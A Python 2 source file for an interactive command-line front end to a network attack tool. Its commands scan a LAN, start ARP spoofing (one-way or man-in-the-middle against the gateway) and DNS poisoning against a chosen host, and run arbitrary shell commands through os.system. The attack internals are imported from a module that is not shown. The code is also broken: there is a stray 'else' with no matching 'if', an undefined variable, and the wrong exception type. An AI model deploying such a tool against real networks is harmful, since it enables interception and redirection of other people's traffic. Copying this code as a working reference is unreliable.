from collections import defaultdict
import netifaces
import os

from hosts import get_hosts


class CLI:

    commands    = {}
    show_params = {}
    set_params  = {}

    def __init__(self):

        self.interface = self.default_interface()
        self.range_    = self.default_range()
        self.own_mac   = self.default_mac()
        self.timeout   = 3

        self.hosts = []

    def run(self):

        args = raw_input(">>> ").split(' ')
    
        try:
            self.commands[args[0]](self, args)

        except KeyError as _:
            print "E: Unknown command \"{}\"".format(args[0])
            self.run()

    def show(self, args):

        try:
            self.show_params[args[1]](self, args[1:])

        except KeyError as _:
            print "E: Unknown parameter \"{}\"".format(args[1])

        self.run()

    commands["show"] = show

    def set_(self, args):

        try:
            self.set_params[args[1]](self, args[1:])

        except KeyError as _:
            print "E: Unknown parameter \"{}\"".format(args[1])

        except IndexError as _:
            print "E: No value specified"

        self.run()

    commands["set"] = set_

    def show_interface(self, _args):
        print self.interface

    show_params["iface"]     = show_interface
    show_params["interface"] = show_interface

    def set_interface(self, args):
        
        self.interface = self.default_interface() if args[1] == "default" else args[1]
        self.own_mac   = self.default_mac()
        self.set_range(["range", "default"])
    
    set_params["iface"]     = set_interface
    set_params["interface"] = set_interface

    def default_interface(self):
        try:
            return netifaces.gateways()["default"][netifaces.AF_INET][1].encode("ascii")
        except:
            print "E: Could not find default gateway. Configure manually if needed."

    def show_mac(self, _args):
        print self.own_mac

    show_params["mac"] = show_mac

    def set_mac(self, args):
        self.own_mac = self.default_mac() if args[1] == "default" else args[1]

    set_params["mac"] = set_mac

    def default_mac(self):
        try:
            return netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]["addr"].encode("ascii")
        except:
            print "E: Could not find own MAC address. Configure manually if needed"

    def show_range(self, _args):
        print self.range_

    show_params["range"] = show_range

    def set_range(self, args):
        self.range_ = self.default_range() if args[1] == "default" else args[1]

    set_params["range"] = set_range

    def default_range(self):
        try:
            addrs = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]
            return addrs["addr"] + "/" + addrs["netmask"]
        except:
            print "E: Could not find default gateway. Configure manually if needed."

    def show_timeout(self, _args):
        print self.timeout

    show_params["timeout"] = show_timeout

    def set_timeout(self, args):
        try:
            self.timeout = float(args[1])
        except:
            print "E: Could not parse input \"{}\" as number".format(args[1])

    set_params["timeout"] = set_timeout

    def show_gateway(self, _args):
        print "gateway at {}".format(self.gateway.ip)

    show_params["gateway"] = show_gateway

    def show_hosts(self, _args):
        print "\n".join(["{}: host at {}".format(i, self.hosts[i].ip) for i in range(len(self.hosts))])

    show_params["hosts"] = show_hosts

    def scan(self, args):

        self.gateway, self.hosts = get_hosts(self.interface, self.range_, self.timeout)
        
        if self.gateway:
            self.show_gateway(None)
        else:
            print "W: No gateway found"

        if self.hosts:
            self.show_hosts(None)
        else:
            print "W: No hosts found"
        
        self.run()
        
    commands["scan"] = scan

    def os_(self, args):
        os.system(" ".join(args[1:]))
        self.run()

    commands["os"] = os_

    def quit_(self, _args):
        pass

    commands["quit"] = quit_

    def get_target(self, args):
        
        try:
            return hosts[int(args[1])]

        except TypeError as _:
            print "E: Could not parse input \"{}\" as integer".format(args[1])

        except IndexError as _:
            print "E: No or non-existent host specified"

    def arp(self, args):

        try:
            self.commands[".arp_" + args[1]](self, args[1:])
        
        except KeyError as _:
            print "E: Unknown command \"{}\"".format(" ".join(args[:2]))

        except IndexError as _:
            print "E: No command specified"

    commands["arp"] = arp

    def arp_set_addrs(self):

        ip_to_spoof  = raw_input("IP address to spoof: ")
        mac_to_spoof = raw_input("MAC address to lead to (leave emtpy for own address): ")

        if not mac_to_spoof:
            mac_to_spoof = self.own_mac

        return ip_to_spoof, mac_to_spoof

    def arp_oneway(self, args):

        target = self.get_target(args)
        ip_to_spoof, mac_to_spoof = self.arp_set_addrs()
        target.arp_attack(True, ip_to_spoof, mac_to_spoof)
        target.arp_start()

    def arp_mitm(self, args):

        target = self.get_target(args)
        ip_to_spoof, mac_to_spoof = self.gateway.ip, self.own_mac
        target.arp_attack(False, ip_to_spoof, mac_to_spoof)
        target.arp_start()

    def arp_stop(self, args):

        target = self.get_target(args)
        target.arp_stop()

    commands[".arp_oneway"] = arp_oneway
    commands[".arp_mitm"]   = arp_mitm
    commands[".arp_stop"]   = arp_stop

    def dns(self, args):

        try: 
            self.commands[".dns_" + args[1]](self, args[1:])
    
        except KeyError as _:
            print "E: Unknown command \"{}\"".format(" ".join(args[:2]))

        except IndexError as _:
            print "E: No command specified"

    commands["dns"] = dns

    def dns_set_addrs(self):

        url_to_spoof = raw_input("URL to spoof: ")
        ip_to_spoof  = raw_input("IP address to lead to (leave empty for own address): ")

        if not ip_to_spoof:
            ip_to_spoof = self.range_.split('/')[0]

        return url_to_spoof, ip_to_spoof

    def dns_start(self, args):

        target = self.get_target(args)
        url_to_spoof, ip_to_spoof = self.dns_set_addrs()
        target.dns_add(url_to_spoof, ip_to_spoof)
        target.dns_start()

        else:
            target.dns_stop()

    commands[".dns_poison"] = dns_start

    def dns_stop(self, args):
        
        target = self.get_target(args)
        target.dns_stop()

    commands[".dns_stop"] = dns_stop

if __name__ == "__main__":

    cli = CLI()
    cli.run()
